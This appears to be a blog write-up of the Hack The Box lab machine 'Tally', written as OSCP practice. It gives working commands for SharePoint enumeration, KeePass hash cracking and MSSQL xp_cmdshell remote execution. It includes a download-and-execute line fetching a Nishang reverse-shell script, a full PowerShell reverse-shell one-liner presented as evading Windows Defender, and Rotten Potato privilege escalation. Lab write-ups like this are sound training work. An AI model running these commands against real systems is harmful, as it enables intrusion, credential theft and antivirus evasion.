Tally is our third machine in the OSCP list provided by [NetSec Focus](https://www.netsecfocus.com/)! This machine was a great learning experience where the solution problem and research skills were essential in order to root this machine. This is the third blog before my third attempt to the OSCP exam, so let's get to it!

## Information Gathering

### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine. 

```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.59
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/nmap1.png" alt="nmap scan">
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/nmap2.png" alt="nmap scan">

So, we see some SMB, MSSQL and HTTP services running where all of them are going to be useful. The enumeration in this box is quite extense, but with some persistence and patiente, the clues are going to be coming out one at the time. I also tried to scan most of the HTTP services with not good result, but there was one that actually was useful that I'll explain later. 
After looking at the smb service running, I tried to do some scanning to see if I could find anything, but unf ortunately the result was not helpful.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/nmap-smb.png" alt="nmap scan">

But after looking for more resources and things to look up in our nmap scan, there was a good __attack vector__ that was related with [Microsoft Sharepoint](https://support.office.com/en-us/article/what-is-sharepoint-97b915e6-651b-43b2-827d-fb25777f446f) running in port 32844. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/attack-vector.png" alt="nmap scan">

After looking how other people did this machine, there were a lot of ideas and tools. One of the tools was the [SharePountURLBrute](https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/) that was accurate in some results. This is the command in order to use the tool:
```
perl SharePointURLBrute.pl -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/sharepoint-urlbrute.png" alt="nmap scan">

Although other people runned [gobuster]() to get some results, but in my case SharePountURLBrute gave more accurate results. In the case if you want to run gobuster, I strongly recommend to download [SecLists](https://github.com/danielmiessler/SecLists) in order to have good results. This is the command to run gobuster. 

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt -u http://10.10.10.59/
```

After finding a couple URLs, the URl that gave useful information was ```http://10.10.10.59/shared%20documents/forms/allitems.aspx``` where there was some details about the ftp log in. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/ftp-documents.png" alt="nmap scan">

After downloading the file, we have the following information. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/ftp-credentials.png" alt="nmap scan">

Great! There is a password, but we don't have a username. It's time to look for more URLs in Microsoft Sharepoint. After trying more tools and not finding results, I tried to look on google things like ```"sharepoint site content url"``` where it came up with this useful [resource](https://docs.microsoft.com/en-us/archive/blogs/how24/famous-sharepoint-urls-locations). So, according to the site one of the URLs that contains information and content was ```http://10.10.10.59/_layouts/15/viewlsts.aspx``` where effectively there was something to look!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/site-page.png" alt="nmap scan">

So after visiting ```http://10.10.10.59/SitePages/FinanceTeam.aspx``` There was a useful file from the Finance Team that contained useful information about the ftp_server. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/site-page-found.png" alt="nmap scan">

This is the information that is related with the ftp user account. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/ftp-user-account.png" alt="nmap scan">

Gratefully, we have username and password which means ```ftp_user:UTDRSCH53c"$6hys```

Then, after trying the credentials, log in was successsful.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/ftp-logedin.png" alt="nmap scan">

Once we are in the ftp server there is a interesting file that we can find at ```\User\Tim\Files``` which is a KeePass file that will be helpful to look more credentials.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/path-key-ftp.png" alt="nmap scan">

Once you find it and get it, you can crack it with [keepass2john](https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc) in order to obtain and extrack the hash with the following command.

```
keepass2john tim.kdbx > tim
```

After we have the hash from thh kdbx file, it's time to crack it wiht [John](https://www.openwall.com/john/)!
```
john -w=/usr/share/wordlists/rockyou.txt tim
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/john-cracked.png" alt="nmap scan">

Then it's time to get in with our credentials ```tim:simplementeyo```.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/keepass.png" alt="nmap scan">

If you need more information on how to do the process showed above, do not forget to visit my writeup for [Jeeves](https://coffeejunkiee.github.io/jeeves-HTB/) where I explain the process with detail. 

After getting in the password manager, there is some information about the Finance user, and if we think about what services we can get in, there is a good chance that we can log in with SMB. So to log in in SMB these are the credentials: ```Finance:Acc0unting```. This is the command to log in with SMB.
```
smbclient -U Finance \\\\10.10.10.59\\ACCT
```
After looking around in the server and files, in the location ```\zz_Migration\Binaries\New Folder``` there is a executable called ```tester.exe``` where looks like it's been customized and therefore it can contain useful information, so after downloading the file ```tester.exe``` there is a good way to look to possible info with the command ```strings```. 
```
strings tester.exe | grep "UID"
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/good-creeds.png" alt="nmap scan">

Then we have credentials ```sa:GWE3V65#6KFH93@4GWTG2G``` for MSSQL ãƒ„
To log in in MSSQL there is a good tool in Kali Linux called [sqsh](https://manpages.debian.org/testing/sqsh/sqsh.1.en.html) that allows login in MSSQL and various services and it's a sql shell for linux. So, after googling ```"MSSQL reverse shell"``` it came up with the resource and usage of __xp_cmdshell__ which allows to execute commands from the command prompt in some kidn of RCE (Remote Code Execution), the problem is that __xp_cmdshell__ is desable, but we can enable it following this [resource](https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/). So, this is the command to log in MSSQL with sqsh.
```
sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/cmd-whoami.png" alt="nmap scan">

Then, time to get the reverse shell. 

## Reverse shell

To do this we can use __xp_cmdshell__  to execute a command that will download a powershell script from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) that will return us a reverse shell to our local machine. Do not forget to put this in the last line of the script ```Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.80 -Port 4444``` otherwise the script won't work and do not forget to set up a netcat listener and a python HTTP server. This is the following command to execute within sqsh using __xp_cmdshell__.
```
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.80/Invoke-PowerShellTcp.ps1') "
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/invoke-shell.png" alt="nmap scan">

and wolah! We got a shell.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/shell-gotten.png" alt="nmap scan">

## User flag
In order to get the user flag we need to navigate to ```C:\Users\Sarah\Desktop``` and type ```type user.txt``` and we got the flag!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/Userflag.png" alt="nmap scan">

## Privilege Escalation
This time I decided to use Rotten Potato without metasploit because in the enumeration there was enough resources to escalate privileges in this way. To start type:
```
whoami /priv
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/rotten-priv.png" alt="nmap scan">

And we have enough privileges to use Rotten Potato. We can go to any directory where we have executable and writeable privileges in order to transfer [MSFRottenPotato.exe]. Also this machine is running Windows 10 from 2016 which is more likely to have Windows Defender, so be wise about the reverse shell that you want to execute with Rotten Potato. In this case I decided to use a powershell script that Windows Defender won't recognize as a malicious file, so create a file in your linux machine named ```shell.bat``` and type the following code:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.80',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
and transfer it to the windows machine. You can use [veil-evasion](https://github.com/Veil-Framework/Veil-Evasion) or [Ebowla](https://github.com/Genetic-Malware/Ebowla) where both of them are nice tools, but this time I decided to keep it simple as possible. 

### Executing Rotten Potato

Before executing Rotten Potato do not forget to set up a listener with netcat in the port that you have decided to use to get the reverse shell. After the listener is up in you reverse shell type:
```
C:\Users\Sarah\Documents\MSFRottenPotato.exe t C:\Users\Sarah\Documents\shell.bat
```

and we have a reverse shell as authority system!

## Root Flag

Navigate through ```C:\\Users\Administrator\Desktop\``` and type ```type root.txt```. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/tally/root-flag.png" alt="nmap scan">

And we have root!

## To conclude

This machine took me too long due to the extense enumeration required. I learned to use certain tools such as sqsh and also to check the nmap scan well because some of the rabbit holes were because I didn't read well the nmap scan which had enough clues to try different things, but definetelly it was a fun box.
